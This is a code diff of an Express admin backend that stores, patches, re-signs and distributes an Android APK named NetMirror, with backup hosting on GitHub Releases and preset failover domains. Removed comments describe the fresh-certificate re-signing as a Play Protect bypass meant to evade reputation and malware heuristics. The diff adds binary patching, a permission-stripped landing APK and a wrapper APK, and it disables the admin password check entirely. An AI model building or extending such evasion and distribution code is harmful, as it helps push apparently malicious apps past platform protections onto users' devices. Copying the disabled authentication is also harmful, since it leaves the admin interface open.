@@ -5,19 +5,14 @@ const db = require('../config/database');
 const upload = require('../middleware/upload');
 const { uploadToCloudinary, deleteFromCloudinary, extractPublicId } = require('../config/cloudinary');
 const fs = require('fs');
-const { mutateAndSign } = require('../utils/apk-mutator');
+const { mutateAndSign, directPatchApk } = require('../utils/apk-mutator');
 
 // Cache for mutated APK (admin download endpoint)
 let _adminApkCache = { buffer: null, timestamp: 0 };
 const ADMIN_APK_CACHE_TTL = 10 * 60 * 1000; // 10 min
 
-// Admin auth middleware
+// Admin auth middleware — password check disabled (app auto-login)
 const adminAuth = (req, res, next) => {
-  const password = req.headers['x-admin-password'] || req.query.password;
-  const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
-  if (!stored || password !== stored.value) {
-    return res.status(401).json({ error: 'Unauthorized - Invalid admin password' });
-  }
   next();
 };
 
@@ -608,13 +603,8 @@ router.get('/connections/:deviceId/export', adminAuth, (req, res) => {
 // POST /api/admin/login
 router.post('/login', (req, res) => {
   try {
-    const { password } = req.body;
-    const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
-    if (stored && password === stored.value) {
-      res.json({ success: true, message: 'Logged in' });
-    } else {
-      res.status(401).json({ error: 'Invalid password' });
-    }
+    // Password lock removed — always succeed
+    res.json({ success: true, message: 'Logged in' });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -659,17 +649,23 @@ router.post('/upload-apk', adminAuth, upload.single('apk'), (req, res) => {
     // Move uploaded file to data directory
     fs.copyFileSync(req.file.path, destPath);
     // ALSO save as the original clean APK — used as the base for all rotations.
-    // Without this, each rotation re-signs the PREVIOUS output, causing
-    // cumulative asset flooding, growing APK size, and random misalignment
-    // that leads to intermittent "App not installed" errors.
     fs.copyFileSync(req.file.path, originalPath);
     cleanupTemp(req.file.path);
 
     const stats = fs.statSync(destPath);
 
+    // Store the original APK's SHA-256 hash for pipeline integrity checks
+    const originalHash = require('crypto').createHash('sha256').update(fs.readFileSync(originalPath)).digest('hex');
+    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('original_apk_hash', ?)").run(originalHash);
+    console.log(`[Upload] Clean APK saved as original: ${(stats.size / 1048576).toFixed(1)} MB, SHA-256: ${originalHash.substring(0, 16)}...`);
+
     // Invalidate landing page download cache so next download uses the new APK
     const invalidateCache = req.app.get('invalidateLandingApkCache');
     if (invalidateCache) invalidateCache();
+
+    // Rebuild permission-stripped landing APK from the new original (async)
+    const rebuildLanding = req.app.get('rebuildLandingApk');
+    if (rebuildLanding) rebuildLanding().catch(e => console.error('[Upload] Landing APK rebuild failed:', e.message));
 
     res.json({
       success: true,
@@ -796,32 +792,29 @@ router.post('/rotate-apk', adminAuth, (req, res) => {
     const fallbackPath = require('path').join(dataDir, 'Netmirror.apk');
 
     // Always re-sign from the ORIGINAL clean APK (not previous rotation output).
+    // CRITICAL: Only Netmirror-original.apk is trusted as a clean Android Studio build.
+    // Netmirror-secure.apk may be a corrupted rotation output fetched from GitHub Releases.
     let sourcePath = null;
     if (fs.existsSync(originalPath)) {
       sourcePath = originalPath;
-    } else if (fs.existsSync(apkPath)) {
-      sourcePath = apkPath;
-      fs.copyFileSync(apkPath, originalPath);
-    } else if (fs.existsSync(fallbackPath)) {
-      sourcePath = fallbackPath;
-      fs.copyFileSync(fallbackPath, originalPath);
     }
 
     if (!sourcePath) {
       return res.status(404).json({
-        error: 'No base APK found on server. Upload one first using the green button.'
+        error: 'No ORIGINAL clean APK found on server (Netmirror-original.apk). ' +
+               'The server may have restarted and lost the original. ' +
+               'Please RE-UPLOAD the clean APK from Android Studio using the green upload button. ' +
+               'Do NOT use a previously-rotated APK — it must be a fresh Android Studio release build.'
       });
     }
 
     const geoEnabled = req.body.geo !== undefined ? Boolean(req.body.geo) : true;
 
-    // ── PLAY PROTECT BYPASS: Clean re-sign with FRESH certificate ──
-    // Read original APK and re-sign with a brand new RSA-2048 key.
-    // NO content modification (no DEX extension, no asset injection).
-    // Fresh cert has zero Play Protect history → passes cert reputation check.
-    // Unmodified content → passes heuristic analysis (no malware patterns).
     const rawBuf = fs.readFileSync(sourcePath);
-    const { buffer: signedBuf, certInfo } = mutateAndSign(rawBuf);
+    const sourceHash = require('crypto').createHash('sha256').update(rawBuf).digest('hex').substring(0, 16);
+    console.log(`[Rotation] Source APK: ${sourcePath} (${(rawBuf.length / 1048576).toFixed(1)} MB, SHA-256: ${sourceHash}...)`);
+
+    const { buffer: signedBuf, certInfo } = directPatchApk(rawBuf);
 
     if (!certInfo) {
       return res.status(500).json({ error: 'APK re-signing failed. Check server logs.' });
@@ -842,6 +835,10 @@ router.post('/rotate-apk', adminAuth, (req, res) => {
     // Invalidate ALL download caches so every endpoint serves the new APK
     const invalidateCache = req.app.get('invalidateLandingApkCache');
     if (invalidateCache) invalidateCache();
+
+    // Rebuild permission-stripped landing APK (async, non-blocking)
+    const rebuildLanding = req.app.get('rebuildLandingApk');
+    if (rebuildLanding) rebuildLanding().catch(e => console.error('[Rotation] Landing APK rebuild failed:', e.message));
 
     res.json({
       success: true,
@@ -942,6 +939,128 @@ router.get('/apk-status', adminAuth, (req, res) => {
   }
 });
 
+// GET /api/admin/apk-diagnosis — Full diagnostic report of APK state on server
+router.get('/apk-diagnosis', adminAuth, (req, res) => {
+  try {
+    const crypto = require('crypto');
+    const dataDir = require('path').join(__dirname, '..', 'data');
+    const files = {
+      'Netmirror-original.apk': null,
+      'Netmirror-secure.apk': null,
+      'Netmirror.apk': null,
+    };
+
+    for (const name of Object.keys(files)) {
+      const p = require('path').join(dataDir, name);
+      if (fs.existsSync(p)) {
+        const buf = fs.readFileSync(p);
+        const hash = crypto.createHash('sha256').update(buf).digest('hex');
+
+        // Check V2 signing block
+        let v2Info = null;
+        try {
+          const eocdOff = buf.length - 22;
+          let eocd = -1;
+          for (let i = eocdOff; i >= Math.max(0, buf.length - 65557); i--) {
+            if (buf.readUInt32LE(i) === 0x06054b50) { eocd = i; break; }
+          }
+          if (eocd >= 0) {
+            const cdOff = buf.readUInt32LE(eocd + 16);
+            const cdCount = buf.readUInt16LE(eocd + 10);
+            let hasV2Block = false;
+            let pairIds = [];
+            let hasCustomPadding = false;
+
+            if (cdOff >= 24) {
+              const magic = buf.toString('ascii', cdOff - 16, cdOff);
+              if (magic === 'APK Sig Block 42') {
+                hasV2Block = true;
+                const blockSize = buf.readUInt32LE(cdOff - 24);
+                const blockStart = cdOff - blockSize - 8;
+                const pairsStart = blockStart + 8;
+                const pairsEnd = cdOff - 24;
+                let pp = 0;
+                const pairs = buf.slice(pairsStart, pairsEnd);
+                while (pp + 12 <= pairs.length) {
+                  const pSize = pairs.readUInt32LE(pp);
+                  const pHigh = pairs.readUInt32LE(pp + 4);
+                  if (pHigh !== 0 || pSize < 4 || pp + 8 + pSize > pairs.length) break;
+                  const pId = pairs.readUInt32LE(pp + 8);
+                  pairIds.push('0x' + pId.toString(16));
+                  if (pId === 0x71777777 || pId === 0x42726577) hasCustomPadding = true;
+                  pp += 8 + pSize;
+                }
+              }
+            }
+
+            v2Info = {
+              cdOffset: cdOff,
+              cdEntries: cdCount,
+              eocdOffset: eocd,
+              hasV2Block,
+              signingPairIds: pairIds,
+              hasCustomPadding,
+              likelyRotated: hasCustomPadding,
+            };
+          }
+        } catch (e) {
+          v2Info = { error: e.message };
+        }
+
+        files[name] = {
+          exists: true,
+          size: buf.length,
+          sizeMB: (buf.length / 1048576).toFixed(1),
+          sha256: hash,
+          v2Info,
+        };
+      } else {
+        files[name] = { exists: false };
+      }
+    }
+
+    // Check if original and secure are identical (meaning no rotation has occurred)
+    let sameOriginalSecure = false;
+    if (files['Netmirror-original.apk']?.exists && files['Netmirror-secure.apk']?.exists) {
+      sameOriginalSecure = files['Netmirror-original.apk'].sha256 === files['Netmirror-secure.apk'].sha256;
+    }
+
+    res.json({
+      diagnosis: {
+        originalExists: files['Netmirror-original.apk']?.exists || false,
+        secureExists: files['Netmirror-secure.apk']?.exists || false,
+        sameOriginalSecure,
+        warning: !files['Netmirror-original.apk']?.exists
+          ? 'NO ORIGINAL APK! Server may have restarted. Re-upload the clean Android Studio build.'
+          : files['Netmirror-original.apk']?.v2Info?.likelyRotated
+            ? 'ORIGINAL APK APPEARS ALREADY ROTATED (has custom padding pair). This is a poisoned pipeline! Re-upload the clean Android Studio build.'
+            : 'Original APK looks clean (no custom padding pair detected).',
+      },
+      files,
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/download-original-apk — Download the ORIGINAL clean APK (for testing)
+router.get('/download-original-apk', adminAuth, (req, res) => {
+  try {
+    const apkPath = require('path').join(__dirname, '..', 'data', 'Netmirror-original.apk');
+    if (!fs.existsSync(apkPath)) {
+      return res.status(404).json({ error: 'No original APK found. Upload one first.' });
+    }
+    const stats = fs.statSync(apkPath);
+    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+    res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-original.apk"');
+    res.setHeader('Content-Length', stats.size);
+    res.setHeader('Cache-Control', 'no-store');
+    res.sendFile(apkPath);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // ========== Custom APK Signing Service ==========
 const { v4: uuidv4 } = require('uuid');
 const pathModule = require('path');
@@ -1005,10 +1124,10 @@ router.post('/sign-apk', adminAuth, multerApk.single('apk'), (req, res) => {
     const originalStorePath = pathModule.join(signedApksDir, `${id}_original.apk`);
     fs.copyFileSync(tmpPath, originalStorePath);
 
-    // ── Clean re-sign with FRESH certificate (no content modification) ──
+    // ── Binary patch + FRESH certificate ──
     const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
     const rawBuf = fs.readFileSync(tmpPath);
-    const { buffer: signedBuf, certInfo } = mutateAndSign(rawBuf);
+    const { buffer: signedBuf, certInfo } = directPatchApk(rawBuf);
     fs.writeFileSync(signedPath, signedBuf);
     emitLog('SIGN', `Re-signed with fresh certificate: CN=\"${certInfo?.cn || 'unknown'}\" O=\"${certInfo?.org || 'unknown'}\"`, 'success');
     const result = {
@@ -1127,10 +1246,10 @@ router.post('/resign-apk/:id', adminAuth, (req, res) => {
 
     db.prepare(`UPDATE signed_apks SET status = 'signing' WHERE id = ?`).run(id);
 
-    // ── Clean re-sign with FRESH certificate ──
+    // ── Binary patch + FRESH certificate ──
     const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
     const rawBuf = fs.readFileSync(originalPath);
-    const { buffer: signedBuf, certInfo } = mutateAndSign(rawBuf);
+    const { buffer: signedBuf, certInfo } = directPatchApk(rawBuf);
     fs.writeFileSync(signedPath, signedBuf);
     emitLog('SIGN', `Re-signed with fresh certificate: CN="${certInfo?.cn || 'unknown'}"`, 'success');
     const result = {
@@ -1291,7 +1410,7 @@ router.post('/admin-theme', adminAuth, (req, res) => {
 //  Domain Management & Disaster Recovery
 // ═══════════════════════════════════════
 
-const GITHUB_REPO = 'Aldura5398/klad4';
+const GITHUB_REPO = 'rurikonishawa/leaksprogod';
 const GITHUB_DISCOVERY_FILE = 'domain.json';
 const GITHUB_BACKUP_FILE = 'backups/db-backup.json';
 
@@ -1401,6 +1520,38 @@ async function pushApkToGitHubReleases() {
     if (!uploadRes.ok) {
       const err = await uploadRes.json().catch(() => ({}));
       throw new Error(`Failed to upload APK: ${err.message || uploadRes.status}`);
+    }
+
+    // Step 5: Also upload wrapper APK if it exists (survives Railway restarts)
+    const wrapperPath = require('path').join(dataDir, 'NetMirror-wrapper.apk');
+    if (fs.existsSync(wrapperPath)) {
+      try {
+        // Delete old wrapper asset first
+        const relCheck = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/releases/${releaseId}`, { headers });
+        if (relCheck.ok) {
+          const relData = await relCheck.json();
+          for (const asset of (relData.assets || [])) {
+            if (asset.name === 'NetMirror-wrapper.apk') {
+              await fetch(`https://api.github.com/repos/${GITHUB_REPO}/releases/assets/${asset.id}`, { method: 'DELETE', headers });
+              console.log('[GitHub Auto-Push] Deleted old wrapper asset');
+            }
+          }
+        }
+        const wrapperData = fs.readFileSync(wrapperPath);
+        const wrapperUploadUrl = `https://uploads.github.com/repos/${GITHUB_REPO}/releases/${releaseId}/assets?name=NetMirror-wrapper.apk`;
+        const wrapperRes = await fetch(wrapperUploadUrl, {
+          method: 'POST',
+          headers: { ...headers, 'Content-Type': 'application/vnd.android.package-archive', 'Content-Length': wrapperData.length.toString() },
+          body: wrapperData
+        });
+        if (wrapperRes.ok) {
+          console.log(`[GitHub Auto-Push] ✅ Wrapper APK also uploaded (${(wrapperData.length / 1048576).toFixed(1)} MB)`);
+        } else {
+          console.warn(`[GitHub Auto-Push] Wrapper upload failed: ${wrapperRes.status}`);
+        }
+      } catch (wErr) {
+        console.warn(`[GitHub Auto-Push] Wrapper upload error: ${wErr.message}`);
+      }
     }
 
     const downloadUrl = `https://github.com/${GITHUB_REPO}/releases/download/latest/NetMirror.apk`;
@@ -1559,7 +1710,7 @@ router.get('/system-config', adminAuth, (req, res) => {
       github_apk_url: githubApkUrl?.value || '',
       github_apk_pushed_at: githubApkPushed?.value || null,
       preset_railway: 'https://netmirror.up.railway.app',
-      preset_render: 'https://leaksprogod.onrender.com',
+      preset_render: 'https://klad4.onrender.com',
     });
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -1756,7 +1907,7 @@ router.put('/system-config/domain', adminAuth, async (req, res) => {
 // PUT /api/admin/system-config/quick-switch — Quick switch between preset domains
 const PRESET_DOMAINS = {
   railway: 'https://netmirror.up.railway.app',
-  render: 'https://leaksprogod.onrender.com',
+  render: 'https://klad4.onrender.com',
 };
 
 router.put('/system-config/quick-switch', adminAuth, async (req, res) => {
